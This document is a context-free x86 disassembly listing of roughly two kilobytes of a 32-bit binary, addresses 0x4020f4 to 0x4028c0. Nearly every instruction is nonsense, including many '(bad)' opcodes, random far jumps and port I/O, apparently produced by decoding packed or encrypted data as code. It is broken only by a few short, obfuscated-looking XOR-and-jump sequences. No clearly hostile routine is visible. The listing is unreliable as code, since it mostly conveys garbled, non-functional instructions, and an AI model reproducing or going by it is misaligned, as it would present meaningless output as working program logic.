  4020f4:	les    edi,FWORD PTR [eax+ebx*8+0xb]
  4020f8:	les    ebx,FWORD PTR [edx+0x16f0f8db]
  4020fe:	sbb    al,0x72
  402100:	cmp    bh,bl
  402102:	cld    
  402103:	rol    dl,cl
  402105:	ds or  ebp,edi
  402108:	inc    eax
  402109:	arpl   dx,bx
  40210b:	dec    edi
  40210c:	lahf   
  40210d:	mov    esp,0x432df933
  402112:	sbb    BYTE PTR [ebx+0x30],bh
  402115:	adc    al,0xb4
  402117:	add    DWORD PTR [esp+esi*8+0x16f0a620],0x56
  40211f:	adc    DWORD PTR [ebx+edx*8],ebp
  402122:	ja     0x402181
  402124:	fnstenv [ecx]
  402126:	dec    ebx
  402127:	pushf  
  402128:	push   ss
  402129:	lock xor BYTE PTR [edi],dh
  40212c:	cmp    eax,0x41e478bb
  402131:	push   ebp
  402132:	fcmovnu st,st(2)
  402134:	sar    BYTE PTR [esi+ebp*1+0x284a9289],1
  40213b:	cli    
  40213c:	outs   dx,DWORD PTR ds:[esi]
  40213d:	or     DWORD PTR [edx+0x5c263ddf],esi
  402143:	dec    esp
  402144:	dec    edx
  402145:	cmp    ecx,DWORD PTR [ebx+ebx*4]
  402148:	loope  0x402161
  40214a:	push   0x63
  40214c:	jne    0x4020ed
  40214e:	xchg   DWORD PTR [edi-0x1fd0e040],esp
  402154:	test   al,0x3a
  402156:	mov    ss,WORD PTR [eax]
  402158:	jl     0x40219f
  40215a:	aaa    
  40215b:	pop    esi
  40215c:	das    
  40215d:	pop    ss
  40215e:	adc    BYTE PTR [ebp+0x2d1f7f3c],ch
  402164:	fldcw  WORD PTR [eax+0x7937b968]
  40216a:	and    ch,ah
  40216c:	dec    eax
  40216d:	das    
  40216e:	outs   dx,BYTE PTR ds:[esi]
  40216f:	jg     0x402123
  402171:	arpl   WORD PTR [ecx+0x69],ax
  402174:	xor    cl,BYTE PTR [edx+0x3c04d3b]
  40217a:	jecxz  0x4020fe
  40217c:	jl     0x40213c
  40217e:	shrd   DWORD PTR [esi],ecx,0x2f
  402182:	daa    
  402183:	jns    0x402124
  402185:	sub    esi,DWORD PTR [edx+0x34]
  402188:	in     eax,dx
  402189:	ss fstp st(6)
  40218c:	ret    
  40218d:	dec    esi
  40218e:	pop    ecx
  40218f:	jmp    0xeefa:0x2afa9186
  402196:	mov    ebx,0x9adb218a
  40219b:	push   ebx
  40219c:	arpl   WORD PTR [eax+0x5dc98f03],ax
  4021a2:	jl     0x4021e4
  4021a4:	mov    edx,0xefab78a1
  4021a9:	out    0xae,eax
  4021ab:	(bad)  
  4021ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021ae:	dec    edx
  4021af:	dec    edx
  4021b0:	xchg   edi,eax
  4021b1:	or     al,0x69
  4021b3:	and    esp,esp
  4021b5:	xor    DWORD PTR [ebx+0x1824d979],eax
  4021bb:	cli    
  4021bc:	xchg   esi,eax
  4021bd:	xor    DWORD PTR [ebx+0x9],0xa1649447
  4021c4:	jle    0x402174
  4021c6:	xchg   ebx,eax
  4021c7:	jns    0x402164
  4021c9:	cmp    ebx,DWORD PTR [esi-0x2d]
  4021cc:	sub    ah,ch
  4021ce:	mov    dl,0x1a
  4021d0:	fistp  QWORD PTR ds:0xd696a3d2
  4021d6:	(bad)  
  4021d7:	jnp    0x402245
  4021d9:	dec    eax
  4021da:	dec    eax
  4021db:	stc    
  4021dc:	inc    ecx
  4021dd:	aas    
  4021de:	xlat   BYTE PTR ds:[ebx]
  4021df:	jae    0x4021ec
  4021e1:	xor    al,ah
  4021e3:	clc    
  4021e4:	push   ebp
  4021e5:	xchg   ebp,eax
  4021e6:	ss (bad) 
  4021e8:	fcomp  QWORD PTR [eax]
  4021ea:	int    0xe0
  4021ec:	popf   
  4021ed:	mov    edi,0x46dc5143
  4021f2:	dec    bl
  4021f4:	in     al,0x11
  4021f6:	das    
  4021f7:	out    dx,eax
  4021f8:	inc    ecx
  4021f9:	retf   0x5534
  4021fc:	lods   eax,DWORD PTR ds:[esi]
  4021fd:	xor    al,BYTE PTR [esi]
  4021ff:	enter  0xf4c6,0xb6
  402203:	div    BYTE PTR [esi+0x4b]
  402206:	push   0x8a6b0f3b
  40220b:	cdq    
  40220c:	not    BYTE PTR [ecx-0x291f52df]
  402212:	out    0xc7,eax
  402214:	dec    ebx
  402215:	imul   ebp,DWORD PTR [ebx],0x76
  402218:	(bad)  
  402219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40221a:	mov    ebp,ecx
  40221c:	repnz xchg ecx,eax
  40221e:	push   ss
  40221f:	sub    BYTE PTR [edx+ebp*8],bh
  402222:	out    dx,eax
  402223:	das    
  402224:	push   ebx
  402225:	mov    BYTE PTR [edi+0x3e],al
  402228:	popa   
  402229:	adc    al,ah
  40222b:	mov    ch,BYTE PTR [ebx+0x24]
  40222e:	fldln2 
  402230:	push   esp
  402231:	mov    dl,0x0
  402233:	jo     0x4021dd
  402235:	pushf  
  402236:	pusha  
  402237:	lds    eax,FWORD PTR [edx]
  402239:	sub    dh,BYTE PTR [edi+0x77]
  40223c:	add    BYTE PTR [edx],0x21
  40223f:	out    0x77,eax
  402241:	push   ebp
  402242:	repnz lahf 
  402244:	mov    esi,DWORD PTR [eax]
  402246:	shr    eax,1
  402248:	mov    dh,0x85
  40224a:	test   al,0xf7
  40224c:	or     bl,BYTE PTR [edi+0x2e5175a0]
  402252:	test   DWORD PTR [eax+0x14],esp
  402255:	inc    ebp
  402256:	push   esi
  402257:	icebp  
  402258:	cld    
  402259:	cmp    eax,0x71957505
  40225e:	fcom   QWORD PTR [ecx]
  402260:	xchg   esp,eax
  402261:	fs pushf 
  402263:	pusha  
  402264:	icebp  
  402265:	loop   0x402244
  402267:	sub    al,0x1f
  402269:	dec    ecx
  40226a:	js     0x40227a
  40226c:	or     eax,0xedcc7881
  402271:	jne    0x40225e
  402273:	lock ret 0xcfdb
  402277:	and    DWORD PTR [edx+0xe],0xefcd2d53
  40227e:	outs   dx,DWORD PTR ds:[esi]
  40227f:	jb     0x4022fe
  402281:	in     al,dx
  402282:	aaa    
  402283:	mov    cl,BYTE PTR [ebx+edx*8]
  402286:	inc    edx
  402287:	and    edx,DWORD PTR [eax-0x5b]
  40228a:	test   BYTE PTR [edi+0x42a57367],ch
  402290:	(bad)  
  402292:	outs   dx,DWORD PTR ds:[esi]
  402293:	ret    
  402294:	aad    0xdd
  402296:	call   0x9e0f:0x4dcdd45f
  40229d:	sar    BYTE PTR [eax+0x27],1
  4022a0:	xchg   esp,eax
  4022a1:	lods   al,BYTE PTR ds:[esi]
  4022a2:	jno    0x4022b4
  4022a4:	popf   
  4022a5:	xor    eax,esi
  4022a7:	and    DWORD PTR ds:0x42a791,0x42a7d5
  4022b1:	add    eax,edi
  4022b3:	cmp    DWORD PTR [ecx],eax
  4022b5:	jne    0x402dc8
  4022bb:	mov    eax,DWORD PTR [ebp+0x8]
  4022be:	mov    ecx,DWORD PTR [ebp-0x18]
  4022c1:	sbb    DWORD PTR ds:0x42a855,0x2700
  4022cb:	xor    eax,esi
  4022cd:	add    eax,edi
  4022cf:	jmp    0x40256e
  4022d4:	xlat   BYTE PTR ds:[ebx]
  4022d5:	cmp    eax,0xd9d5d1c7
  4022da:	fxch   st(1)
  4022dc:	mov    edi,0xf9682c5b
  4022e1:	icebp  
  4022e2:	mov    bh,0x87
  4022e4:	add    al,0x9
  4022e6:	js     0x402360
  4022e8:	(bad)  
  4022e9:	jle    0x402363
  4022eb:	js     0x4022de
  4022ed:	mov    dh,0x56
  4022ef:	xchg   ecx,eax
  4022f0:	and    esp,ecx
  4022f2:	mov    ah,0x8d
  4022f4:	scas   al,BYTE PTR es:[edi]
  4022f5:	pop    esp
  4022f6:	leave  
  4022f7:	sbb    DWORD PTR [ebx-0x30],edx
  4022fa:	push   edx
  4022fb:	push   ecx
  4022fc:	(bad)  
  4022fd:	fisttp DWORD PTR [edx-0xc063855]
  402303:	sub    eax,0x2ea91cf0
  402308:	enter  0xdd79,0x96
  40230c:	jmp    edi
  40230e:	stc    
  40230f:	fist   WORD PTR [ebp+0x79ff8ede]
  402315:	add    DWORD PTR [edx],esi
  402317:	sbb    bl,bh
  402319:	xchg   ebp,eax
  40231a:	mov    al,0x56
  40231c:	xor    BYTE PTR [edx],ah
  40231e:	arpl   di,si
  402320:	xchg   esi,eax
  402321:	test   al,0x2f
  402323:	sbb    DWORD PTR [eax-0x17],ecx
  402326:	shl    BYTE PTR [eax+0x52],cl
  402329:	(bad)  
  40232a:	fnstsw WORD PTR [esi]
  40232c:	call   0xc5e0cae6
  402331:	add    BYTE PTR [ecx+0x7cf8ac68],0x80
  402338:	jb     0x402345
  40233a:	lods   eax,DWORD PTR ds:[esi]
  40233b:	call   0x709d2a49
  402340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402341:	mov    al,ds:0x52a406e4
  402346:	push   ebp
  402347:	(bad)
  40234b:	lods   al,BYTE PTR ds:[esi]
  40234c:	and    al,0xa3
  40234e:	arpl   WORD PTR [edi-0x34],ax
  402351:	gs push ebx
  402353:	je     0x40233a
  402355:	movups XMMWORD PTR [esp+esi*2],xmm4
  402359:	push   ecx
  40235a:	fsubr  DWORD PTR [edx]
  40235c:	adc    edi,edi
  40235e:	clc    
  40235f:	sbb    BYTE PTR [ecx+0x6d],bh
  402362:	xor    BYTE PTR [ebx+0x2b],dh
  402365:	dec    ecx
  402366:	pop    edx
  402367:	xchg   ebp,eax
  402368:	pusha  
  402369:	pop    bx
  40236b:	adc    esi,edi
  40236d:	mov    BYTE PTR es:[eax],dl
  402370:	shl    DWORD PTR [ebp+0x7833b377],cl
  402376:	loopne 0x4023ec
  402378:	dec    eax
  402379:	cmc    
  40237a:	adc    ebp,esp
  40237c:	scas   al,BYTE PTR es:[edi]
  40237d:	rcr    DWORD PTR [ebx+0x21],cl
  402380:	mov    ecx,0x5cba75c
  402385:	cli    
  402386:	jae    0x4023bb
  402388:	push   ebp
  402389:	je     0x4023c2
  40238b:	mov    ah,0x90
  40238d:	(bad)  
  40238f:	and    ah,cl
  402391:	pop    ebp
  402392:	sti    
  402393:	jno    0x402404
  402395:	sbb    BYTE PTR [ebx-0x1e654611],dh
  40239b:	jl     0x4023ef
  40239d:	popf   
  40239e:	jmp    0xac1d:0xbffd426b
  4023a5:	adc    BYTE PTR [ebx],0x67
  4023a8:	sbb    dl,BYTE PTR [edi+0x43]
  4023ab:	test   bh,cl
  4023ad:	repz lds ebp,FWORD PTR [eax+0x69]
  4023b1:	inc    edx
  4023b2:	jbe    0x4023f3
  4023b4:	adc    esi,DWORD PTR [edx-0x14]
  4023b7:	pop    ebx
  4023b8:	iret   
  4023b9:	imul   ebx,DWORD PTR [ebx],0xae641953
  4023bf:	xor    BYTE PTR [ebp-0x42],al
  4023c2:	cdq    
  4023c3:	mov    al,0xcc
  4023c5:	in     eax,0xb2
  4023c7:	pop    esi
  4023c8:	jge    0x4023ad
  4023ca:	in     eax,dx
  4023cb:	push   0xbcb3f989
  4023d0:	jnp    0x402419
  4023d2:	retf   
  4023d3:	les    ebx,FWORD PTR [ebp+0x45]
  4023d6:	mov    eax,0xc7af5696
  4023db:	cdq    
  4023dc:	test   al,0x1a
  4023de:	mov    cx,0x8f68
  4023e2:	cmp    bh,BYTE PTR cs:[eax+ecx*1]
  4023e6:	push   cs
  4023e7:	sahf   
  4023e8:	fisttp WORD PTR [eax-0x7d77aa92]
  4023ee:	xor    eax,0x65872ee5
  4023f3:	xchg   DWORD PTR [ebp-0x72652f16],eax
  4023f9:	push   esp
  4023fa:	das    
  4023fb:	or     al,0xe2
  4023fd:	xchg   edi,eax
  4023fe:	shl    ecx,1
  402400:	push   ss
  402401:	jle    0x40240b
  402403:	adc    BYTE PTR [eax],al
  402405:	mov    BYTE PTR [edx-0x1099e8fd],dh
  40240b:	shl    BYTE PTR [ecx-0x2a],0xb3
  40240f:	cld    
  402410:	mov    ds:0xfe3f17de,eax
  402415:	bnd jnp 0x4023ee
  402418:	shr    DWORD PTR [edi-0x42],cl
  40241b:	and    al,0xc6
  40241d:	je     0x40248f
  40241f:	loope  0x40240b
  402421:	std    
  402422:	mov    ebp,0x8694dacc
  402427:	fwait
  402428:	or     esi,ecx
  40242a:	enter  0x4e57,0xa5
  40242e:	(bad)  
  40242f:	lods   eax,DWORD PTR ds:[esi]
  402430:	cld    
  402431:	mov    DWORD PTR [edx],edx
  402433:	mov    ch,BYTE PTR [edx+0x374d317b]
  402439:	std    
  40243a:	mov    ah,0xc
  40243c:	dec    ebx
  40243d:	jne    0x40245b
  40243f:	(bad)  
  402440:	int3   
  402441:	xor    ah,BYTE PTR [edx-0x6f4b583a]
  402447:	leave  
  402448:	test   DWORD PTR [ebp+0x6a8e51d1],edi
  40244e:	mov    esp,0x3e5f9d24
  402453:	sub    BYTE PTR [ebp+0x14013a58],dh
  402459:	dec    eax
  40245a:	mov    WORD PTR [ecx],ss
  40245c:	mov    dl,0xb
  40245e:	inc    eax
  40245f:	sbb    edx,esi
  402461:	mov    dh,0x5d
  402463:	dec    ebp
  402464:	es iret 
  402466:	rcl    BYTE PTR [esi+0xd],0xd
  40246a:	push   edi
  40246b:	xchg   ebx,eax
  40246c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40246d:	stos   BYTE PTR es:[edi],al
  40246e:	jecxz  0x40249d
  402470:	and    BYTE PTR [edi],bh
  402472:	ds inc esi
  402474:	sub    al,0x6f
  402476:	mov    al,ds:0x16506e52
  40247b:	div    BYTE PTR [ebp+0x6a]
  40247e:	test   DWORD PTR [eax-0x74],0x1ac39838
  402485:	mov    ah,0xfa
  402487:	das    
  402488:	sub    DWORD PTR [edx-0x31552b0],ecx
  40248e:	lock daa 
  402490:	dec    ebp
  402491:	mov    eax,0x195a9657
  402496:	add    dh,bh
  402498:	push   ecx
  402499:	(bad)  
  40249b:	and    al,0x81
  40249d:	adc    BYTE PTR [ebx+eiz*2],0x69
  4024a1:	ret    0x20d1
  4024a4:	je     0x402525
  4024a6:	xchg   esp,eax
  4024a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024a8:	scas   eax,DWORD PTR es:[edi]
  4024a9:	push   edx
  4024aa:	adc    al,0x7c
  4024ac:	sbb    ch,BYTE PTR [ecx+0x5b]
  4024af:	dec    edi
  4024b0:	push   es
  4024b1:	cmp    BYTE PTR [edx-0x26],ch
  4024b4:	enter  0x8158,0x42
  4024b8:	sbb    DWORD PTR [edx-0x29],esp
  4024bb:	mov    ch,0x9b
  4024bd:	xchg   edi,eax
  4024be:	jmp    0x5cd447c6
  4024c3:	and    eax,0x113b463f
  4024c8:	in     eax,dx
  4024c9:	(bad)  
  4024cb:	js     0x4024f6
  4024cd:	pop    esi
  4024ce:	daa    
  4024cf:	pop    ss
  4024d0:	mov    al,ds:0xecb15153
  4024d5:	pop    edi
  4024d6:	test   BYTE PTR [edi],cl
  4024d8:	xor    DWORD PTR [edx+0x7d],edx
  4024db:	popf   
  4024dc:	or     al,0xe4
  4024de:	das    
  4024df:	clc    
  4024e0:	adc    al,0xbe
  4024e2:	add    ecx,DWORD PTR [esp+esi*4-0x57]
  4024e6:	das    
  4024e7:	push   esi
  4024e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024e9:	in     al,0x81
  4024eb:	sub    al,0xa1
  4024ed:	call   0x15f7:0x4ac0d136
  4024f4:	sti    
  4024f5:	mov    BYTE PTR [esi+0x1971c14f],ch
  4024fb:	mov    al,0x49
  4024fd:	clc    
  4024fe:	xor    al,0x77
  402500:	fwait
  402501:	pop    ss
  402502:	(bad)  
  402503:	xchg   edi,eax
  402504:	inc    edx
  402505:	out    dx,eax
  402506:	xor    BYTE PTR [edi-0x65],0xc7
  40250a:	call   0x32f4:0xb6415961
  402511:	(bad)  
  402512:	push   ecx
  402513:	sahf   
  402514:	inc    edx
  402515:	xchg   BYTE PTR [esi-0x46bae75d],dl
  40251b:	fwait
  40251c:	xchg   esi,eax
  40251d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40251e:	pop    ds
  40251f:	sub    bl,BYTE PTR [edi]
  402521:	jmp    0xe21a46b
  402526:	stos   DWORD PTR es:[edi],eax
  402527:	pop    ebx
  402528:	mov    edx,0xc710088f
  40252d:	retf   
  40252e:	add    DWORD PTR [edi+0x7f59aaf6],ebp
  402534:	mov    cl,0x56
  402536:	sar    bh,cl
  402538:	or     ecx,edi
  40253a:	gs test al,0x1a
  40253d:	(bad)  
  40253e:	enter  0x362,0xb3
  402542:	inc    edx
  402543:	scas   eax,DWORD PTR es:[edi]
  402544:	mul    ebx
  402546:	sbb    al,0x4f
  402548:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402549:	cmc    
  40254a:	mov    dh,0x21
  40254c:	div    DWORD PTR [edi]
  40254e:	leave  
  40254f:	mov    cl,0xe
  402551:	push   es
  402552:	fnstsw WORD PTR [eax]
  402554:	jns    0x4025b6
  402556:	sub    DWORD PTR [esi],ebp
  402558:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402559:	ss das 
  40255b:	iret   
  40255c:	jnp    0x4025c6
  40255e:	add    al,0x25
  402560:	mov    edi,0xe0003697
  402565:	jl     0x402520
  402567:	sub    BYTE PTR [ecx-0x72],dh
  40256a:	push   ebp
  40256b:	stos   BYTE PTR es:[edi],al
  40256c:	bound  ebp,QWORD PTR [ebp+0x39]
  40256f:	add    DWORD PTR [edi],ecx
  402571:	test   DWORD PTR [edx+eax*1+0x458b0000],edi
  402578:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  40257e:	add    eax,edi
  402580:	mov    DWORD PTR [ecx],eax
  402582:	jmp    0x402821
  402587:	aas    
  402588:	retf   
  402589:	ret    0xcace
  40258c:	aad    0xd3
  40258e:	fld    DWORD PTR [ecx+eiz*1+0x26]
  402592:	inc    edx
  402593:	dec    esp
  402594:	or     bl,dl
  402596:	add    BYTE PTR [edx-0x18787f1],cl
  40259c:	jle    0x402616
  40259e:	js     0x402523
  4025a0:	shl    bh,cl
  4025a2:	sub    esi,0x36daf3b0
  4025a8:	pusha  
  4025a9:	adc    eax,0x662115b7
  4025ae:	sub    ebp,DWORD PTR [esi]
  4025b0:	add    dl,BYTE PTR [ecx+eiz*1-0x3207f9]
  4025b7:	jno    0x40257f
  4025b9:	into   
  4025ba:	cmp    al,0xcf
  4025bc:	(bad)  
  4025bd:	rcl    dh,0xda
  4025c0:	popa   
  4025c1:	jecxz  0x402616
  4025c3:	ss std 
  4025c5:	inc    esi
  4025c6:	jns    0x40259c
  4025c8:	arpl   WORD PTR [eax-0x1e9e2191],cx
  4025ce:	test   eax,0xfd6dc8fd
  4025d3:	mov    eax,0xe1e82bf5
  4025d8:	addr16 int3 
  4025da:	push   eax
  4025db:	adc    eax,0x9e6f7846
  4025e0:	push   eax
  4025e1:	rcl    BYTE PTR [ecx+0x1dfa6337],cl
  4025e7:	cwde   
  4025e8:	or     DWORD PTR [edx-0x7c],edi
  4025eb:	addr16 mov eax,ds:0x23ae
  4025ef:	in     al,0x4c
  4025f1:	dec    ebx
  4025f2:	pop    edx
  4025f3:	and    edx,DWORD PTR [ebx-0x3a1c6a4f]
  4025f9:	cmp    dh,BYTE PTR [eax]
  4025fb:	stos   DWORD PTR es:[edi],eax
  4025fc:	shl    dl,0x4a
  4025ff:	sub    ebx,DWORD PTR [edx-0x5f8b3d50]
  402605:	je     0x40260e
  402607:	adc    al,0x4f
  402609:	push   ecx
  40260a:	xor    BYTE PTR [esi-0x33359921],0x6
  402611:	iret   
  402612:	ss xchg ebp,eax
  402614:	test   BYTE PTR [eax],ah
  402616:	outs   dx,DWORD PTR ds:[esi]
  402617:	iret   
  402618:	mov    cl,BYTE PTR [esi]
  40261a:	add    ebp,DWORD PTR [ebx+0x39]
  40261d:	push   0x77
  40261f:	fistp  WORD PTR [ebp-0x8]
  402622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402623:	xchg   BYTE PTR [ebp+0x51146bc8],ch
  402629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40262a:	icebp  
  40262b:	test   al,0xec
  40262d:	ins    DWORD PTR es:[edi],dx
  40262e:	mov    al,ds:0x7bde78e8
  402633:	jae    0x40260b
  402635:	sub    edx,DWORD PTR [ecx+0x181615b8]
  40263b:	popf   
  40263c:	dec    esp
  40263d:	not    BYTE PTR [edx+ebp*8]
  402640:	xchg   al,cl
  402642:	push   ecx
  402643:	add    ah,BYTE PTR [eax+ebp*8]
  402646:	je     0x402622
  402648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402649:	or     esi,DWORD PTR [ecx+ebx*8-0x5c]
  40264d:	sub    DWORD PTR [edx-0x755d27f3],esp
  402653:	adc    bh,dl
  402655:	add    DWORD PTR [ebx-0xd7c3ef8],edx
  40265b:	stc    
  40265c:	xor    eax,0xca46cba
  402661:	imul   esp,ebx,0xf9c5eb4c
  402667:	mov    al,ds:0x6096936f
  40266c:	or     ebp,DWORD PTR [edi]
  40266e:	std    
  40266f:	and    edi,ecx
  402671:	(bad)  
  402672:	clc    
  402673:	imul   ebx,esp,0xffffffab
  402676:	pushf  
  402677:	daa    
  402678:	(bad)  
  402679:	(bad)  
  40267a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40267b:	mov    al,dh
  40267d:	cmp    eax,0x650dd221
  402682:	jmp    0x4e212cb2
  402687:	popa   
  402688:	dec    edi
  402689:	iret   
  40268a:	fstp   QWORD PTR [edi]
  40268c:	mov    dh,BYTE PTR [edx]
  40268e:	in     eax,dx
  40268f:	fsubrp st(4),st
  402691:	stos   DWORD PTR es:[edi],eax
  402692:	mov    al,BYTE PTR [edx-0x7]
  402695:	ds sub bl,dl
  402698:	push   esi
  402699:	xchg   esi,edx
  40269b:	stos   DWORD PTR es:[edi],eax
  40269c:	jl     0x4026c7
  40269e:	gs jb  0x402647
  4026a1:	jnp    0x402719
  4026a3:	xchg   edx,eax
  4026a4:	and    dl,dl
  4026a6:	cmp    ah,ah
  4026a8:	xchg   DWORD PTR [ecx],ecx
  4026aa:	sub    al,0x6e
  4026ac:	sbb    eax,0x77bdf41f
  4026b1:	mov    al,ds:0xceddea6c
  4026b6:	jge    0x4026bc
  4026b8:	mov    ebx,0xcf8251ec
  4026bd:	ror    BYTE PTR [ecx+0x255c2b5f],cl
  4026c3:	fwait
  4026c4:	xchg   esi,eax
  4026c5:	adc    BYTE PTR [eax+0x9],ah
  4026c8:	sbb    eax,0xbad29cde
  4026cd:	add    BYTE PTR [ecx],0xd
  4026d0:	call   0xdcf384fd
  4026d5:	xchg   esi,eax
  4026d6:	jle    0x402752
  4026d8:	xchg   ax,ax
  4026da:	jno    0x402754
  4026dc:	rcl    BYTE PTR ss:[ecx-0x3e],1
  4026e0:	jne    0x402712
  4026e2:	inc    edx
  4026e3:	cmc    
  4026e4:	ds mov esp,0xb14a17d5
  4026ea:	mov    ds:0x3d72c685,eax
  4026ef:	rcr    BYTE PTR [edi+esi*8+0x60a8be2e],cl
  4026f6:	adc    BYTE PTR [esi],al
  4026f8:	arpl   WORD PTR [ebx+0x7e],cx
  4026fb:	cmp    esp,ebp
  4026fd:	dec    ebx
  4026fe:	mov    ch,0xfe
  402700:	mov    esp,cs
  402702:	jo     0x4026aa
  402704:	inc    ebx
  402705:	sti    
  402706:	loop   0x402722
  402708:	adc    al,0xed
  40270a:	pop    es
  40270b:	sbb    BYTE PTR [eax+edx*2-0x3d],cl
  40270f:	mov    esi,0xb9bdc00f
  402714:	jno    0x402707
  402716:	out    0xb5,al
  402718:	hlt    
  402719:	or     bl,dl
  40271b:	leave  
  40271c:	mov    bh,0x8e
  40271e:	hlt    
  40271f:	mov    bh,BYTE PTR [eax-0x1a72dc92]
  402725:	jae    0x40273b
  402727:	xor    al,0xa9
  402729:	cmp    DWORD PTR [ebx-0x16573ac0],0xce1c2204
  402733:	pop    edi
  402734:	unpcklps xmm6,XMMWORD PTR [ebp-0x12b85dab]
  40273b:	fwait
  40273c:	mov    ecx,0xc125dac7
  402741:	in     eax,0x73
  402743:	sbb    DWORD PTR [eax+0x3932fafd],0xfffffffa
  40274a:	push   ds
  40274b:	(bad)  
  40274c:	push   ds
  40274d:	cmp    eax,0x7f5601b8
  402752:	ins    DWORD PTR es:[edi],dx
  402753:	clc    
  402754:	adc    eax,0xb216277b
  402759:	xor    DWORD PTR [edi],esp
  40275b:	mov    ebx,cs
  40275d:	call   0x28e7:0x7d9e0217
  402764:	jmp    0x402713
  402766:	(bad)  
  402767:	push   ebx
  402768:	mov    BYTE PTR [eax-0x3d],cl
  40276b:	fnsave [eax+0x7d]
  40276e:	or     DWORD PTR es:[eax],esp
  402771:	repz test BYTE PTR [ebp-0x6b749305],dh
  402778:	sbb    DWORD PTR [ebx-0x11],edx
  40277b:	pop    ds
  40277c:	sub    eax,0x68869e7e
  402781:	jo     0x4027df
  402783:	or     DWORD PTR [eax-0x3],ecx
  402786:	jg     0x4027c6
  402788:	jecxz  0x40275c
  40278a:	ret    
  40278b:	adc    cl,BYTE PTR [edx]
  40278d:	cmp    ecx,DWORD PTR [edi+0x7ba4000e]
  402793:	push   esi
  402794:	or     DWORD PTR [esi+edi*8+0x2e],esi
  402798:	push   esi
  402799:	xchg   esi,eax
  40279a:	add    BYTE PTR [edx],al
  40279c:	stos   DWORD PTR es:[edi],eax
  40279d:	dec    esi
  40279e:	das    
  40279f:	jno    0x4027d6
  4027a1:	adc    eax,0x7495f25c
  4027a6:	sbb    al,BYTE PTR [ecx+0x42]
  4027a9:	aas    
  4027aa:	retf   0x927c
  4027ad:	enter  0x3f71,0xaf
  4027b1:	pop    ds
  4027b2:	cs int3 
  4027b4:	jne    0x4027e4
  4027b6:	(bad)  
  4027b7:	aas    
  4027b8:	(bad)  
  4027b9:	aad    0x6f
  4027bb:	dec    esi
  4027bc:	mov    bh,0xbe
  4027be:	jno    0x402793
  4027c0:	add    al,dl
  4027c2:	pushf  
  4027c3:	pop    ebp
  4027c4:	mov    cl,0xd2
  4027c6:	dec    esp
  4027c7:	mov    al,ds:0x5368ebc4
  4027cc:	imul   BYTE PTR [ecx-0x43]
  4027cf:	fnstenv [ecx-0x161c0de3]
  4027d5:	jns    0x40276d
  4027d7:	loopne 0x402773
  4027d9:	and    al,0x7a
  4027db:	jbe    0x4027d1
  4027dd:	in     eax,dx
  4027de:	stos   BYTE PTR es:[edi],al
  4027df:	jmp    0x38bc122b
  4027e4:	or     esi,DWORD PTR [esi-0xda132ef]
  4027ea:	pop    ss
  4027eb:	mov    ch,0xe
  4027ed:	cmp    al,0x94
  4027ef:	jecxz  0x40284d
  4027f1:	dec    ebp
  4027f2:	push   es
  4027f3:	mov    ebx,0xc6d31bbc
  4027f8:	mov    eax,ds:0x961e72d2
  4027fd:	xlat   BYTE PTR ds:[ebx]
  4027fe:	pop    ds
  4027ff:	loope  0x402807
  402801:	neg    DWORD PTR ds:0x815f949
  402807:	or     dh,BYTE PTR [eax-0x18091ad]
  40280d:	iret   
  40280e:	push   es
  40280f:	jmp    0xd46c:0xcde17b1
  402816:	cmp    DWORD PTR [edx+0x74],esi
  402819:	push   ebx
  40281a:	(bad)  
  40281b:	fist   DWORD PTR [esi+0x20]
  40281e:	xor    esp,DWORD PTR [edx+0x28]
  402821:	mov    eax,DWORD PTR [ebp-0x10]
  402824:	mov    ecx,DWORD PTR [ebp+0x10]
  402827:	xor    ecx,esi
  402829:	mov    edx,0xffcd8d68
  40282e:	sub    edx,ecx
  402830:	add    DWORD PTR [eax],edx
  402832:	mov    eax,ds:0x41ebba
  402837:	mov    eax,DWORD PTR [eax]
  402839:	mov    cx,WORD PTR [ebp-0x4]
  40283d:	movzx  ecx,cx
  402840:	add    ecx,DWORD PTR [eax]
  402842:	mov    DWORD PTR [ebp-0x18],ecx
  402845:	mov    eax,DWORD PTR [ebp+0xc]
  402848:	mov    ecx,DWORD PTR [ebp+0xc]
  40284b:	xor    eax,esi
  40284d:	lea    eax,[eax+eax*1+0x327298]
  402854:	xor    ecx,esi
  402856:	sub    ecx,eax
  402858:	mov    ax,WORD PTR [ebp-0x4]
  40285c:	movzx  eax,ax
  40285f:	cmp    eax,ecx
  402861:	mov    eax,DWORD PTR [ebp+0x10]
  402864:	movzx  ecx,WORD PTR [ebp-0x4]
  402868:	jg     0x402dbb
  40286e:	xor    eax,esi
  402870:	jmp    0x402b0f
  402875:	ret    
  402876:	ror    ecx,cl
  402878:	into   
  402879:	(bad)  
  40287b:	fcmovnbe st,st(1)
  40287d:	out    0x1c,eax
  40287f:	dec    esp
  402880:	stos   BYTE PTR es:[edi],al
  402881:	imul   esi,DWORD PTR [ecx+0x2a],0xffffffce
  402885:	or     BYTE PTR [eax+edi*2],cl
  402888:	js     0x402888
  40288a:	jle    0x402904
  40288c:	js     0x402839
  40288e:	xor    esp,DWORD PTR [ebx+ebx*2-0x603e57f4]
  402895:	sti    
  402896:	cs sti 
  402898:	leave  
  402899:	in     al,dx
  40289a:	cmp    ah,dl
  40289c:	dec    edx
  40289d:	push   esp
  40289e:	(bad)  
  40289f:	into   
  4028a0:	jno    0x402893
  4028a2:	hlt    
  4028a3:	mov    eax,ds:0xeac7a88b
  4028a8:	xor    BYTE PTR [edx-0x3e],bh
  4028ab:	and    BYTE PTR [edx],dh
  4028ad:	xor    al,0xa4
  4028af:	xor    eax,0xa039e749
  4028b4:	cs in  eax,dx
  4028b6:	sbb    dl,cl
  4028b8:	xchg   ecx,eax
  4028b9:	mov    esp,0x171bb90d
  4028be:	jge    0x4028b1
  4028c0:	and    DWORD PTR [edi+0x22],edx
